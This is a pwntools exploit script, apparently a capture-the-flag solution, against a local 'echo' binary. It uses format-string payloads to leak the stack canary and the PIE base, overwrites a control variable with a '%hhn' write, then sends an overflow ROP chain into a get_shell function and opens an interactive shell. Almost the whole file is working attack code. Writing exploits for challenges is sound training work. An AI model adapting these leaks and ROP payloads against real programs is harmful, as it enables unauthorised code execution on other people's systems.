#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
from pwn import *


se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb, timeout = 1)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
    gdbscript = 'directory %smalloc/\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio/\n' % glibc_dir
    gdbscript += 'directory %self/\n' % glibc_dir
    gdbscript += 'set follow-fork-mode parent\n'
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)

elf = ELF('./echo')
context(arch = elf.arch ,log_level = 'debug', os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])
p = process("./echo")
vuln_func = elf.symbols['vuln_func']


## 1. Leak canary by Format string attack
ru("nput:\n")
sl("%19$llx")
canary = int(rc(16), 16)

## 2. Leak base address by Format string attack
ru("nput:\n")
sl("%21$llx")
get_shell = int(rc(12), 16) - 0xfe
can_leave = get_shell + 0x2dc0
base = get_shell - elf.symbols['get_shell']
ret_gadget = base + 0x101a

## 3. Utilize Format string attack to modify "can_leave"
ru("nput:\n")
sl("aa%7$hhn" + p64(can_leave))

## 4. ROP
ru("nput:\n")
sl("a" * 0x68 + p64(canary) + p64(0) + p64(ret_gadget) + p64(get_shell))

## 5. return
ru("nput:\n")
sl("--")
p.interactive()
